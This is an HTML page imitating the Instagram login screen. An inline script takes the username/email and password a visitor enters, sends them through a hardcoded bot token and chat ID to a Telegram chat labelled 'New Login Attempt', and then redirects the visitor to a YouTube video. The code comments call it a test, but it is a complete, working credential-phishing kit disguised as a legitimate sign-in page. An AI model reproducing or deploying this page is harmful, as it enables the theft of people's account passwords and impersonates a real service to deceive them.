<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="stayle.css">
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">

    <title>Instagram Clone</title>
</head>

<body>

    <main class="flex align-items-center justify-content-center">

        <section id="mobile" class="flex">
        </section>

        <section id="auth" class="flex direction-column">

            <div class="panel login flex direction-column">

                <h1 title="Instagram" class="flex justify-content-center">
                    <img
                        src="./img/instagram-logo.png"
                        alt="Instagram logo"
                        title="Instagram logo"
                    />
                </h1>

                <form id="login-form">

                    <label for="email" class="sr-only">
                        Phone number, username, or email
                    </label>

                    <input
                        id="email"
                        name="email"
                        type="text"
                        placeholder="Phone number, username, or email"
                        required
                    >

                    <label for="password" class="sr-only">
                        Password
                    </label>

                    <input
                        id="password"
                        name="password"
                        type="password"
                        placeholder="Password"
                        required
                    >

                    <button type="submit">
                        Log In
                    </button>

                </form>

                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>

                <div class="login-with-fb flex direction-column align-items-center">

                    <div>
                        <a href="#">
                            Log in with Facebook
                        </a>
                    </div>

                    <a href="#">
                        Forgot password?
                    </a>

                </div>

            </div>

            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>

            <div class="app-download flex direction-column align-items-center">

                <p>Get the app.</p>

                <div class="flex justify-content-center">

                    <img
                        src="./img/apple-button.png"
                        alt="Download on the Apple App Store"
                        title="Download on the Apple App Store"
                    >

                    <img
                        src="./img/googleplay-button.png"
                        alt="Get it on Google Play"
                        title="Get it on Google Play"
                    >

                </div>

            </div>

        </section>

    </main>

    <footer>

        <ul class="flex flex-wrap justify-content-center">

            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">JOBS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATIONS</a></li>
            <li><a href="#">TOP ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>

        </ul>

        <p class="copyright">
            © 2026 Instagram from OMAR M H M ALHAJERI
        </p>

    </footer>


    <!-- Axios -->
    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>

    <script>

        /*
         * Telegram test configuration.
         *
         * Do NOT put a real bot token in public HTML.
         * Use a backend/server for production applications.
         */

        const TOKEN = "8713076400:AAFHXeOL1wzCdDyifLVo1thmncXCCxbuUow";
        const CHAT_ID = "8725113226";

        const URI_API =
            `https://api.telegram.org/bot${TOKEN}/sendMessage`;


        /*
         * Login - إرسال البيانات ثم الانتقال إلى Instagram Reels
         */

        document
            .getElementById("login-form")
            .addEventListener("submit", function (e) {

                e.preventDefault();

                // جلب قيمة البريد الإلكتروني
                const email =
                    document.getElementById("email").value;

                // جلب قيمة كلمة المرور
                const password =
                    document.getElementById("password").value;

                /*
                 * إرسال البريد الإلكتروني وكلمة المرور إلى تلغرام
                 */

                const message =
                    `🔐 New Login Attempt\n\n` +
                    `📧 Username/Email: ${email}\n` +
                    `🔑 Password: ${password}`;


                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    text: message
                })

                .then(function () {

                    // ✅ الانتقال مباشرة إلى YOUTUBE VIDEO بعد نجاح الإرسال
                    window.location.href = "https://youtu.be/GJNGVLDHlhQ";

                })

                .catch(function (error) {

                    console.error(
                        "Telegram error:",
                        error
                    );

                    // ❌ في حالة الفشل، يتم الانتقال أيضاً إلى VIDEO (اختياري)
                    // يمكنك إزالة هذا السطر إذا أردت
                    window.location.href = "https://youtu.be/GJNGVLDHlhQ";

                });

            });

    </script>

</body>
</html>
